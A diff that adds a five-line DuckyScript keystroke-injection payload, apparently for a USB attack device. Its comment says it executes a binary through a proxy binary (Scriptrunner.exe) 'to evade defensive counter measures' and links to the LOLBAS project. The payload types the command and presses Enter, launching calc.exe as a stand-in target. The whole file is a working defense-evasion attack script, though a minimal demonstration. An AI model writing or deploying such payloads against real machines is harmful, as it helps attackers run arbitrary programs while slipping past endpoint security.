@@ -1,0 +1,5 @@
+REM By Joshua O' Brien
+REM executes binary through proxy binary to evade defensive counter measures, more info here https://lolbas-project.github.io/lolbas/Binaries/Scriptrunner/
+DEFAULT_DELAY 350   
+STRING Scriptrunner.exe -appvscript C:\Windows\System32\calc.exe
+ENTER
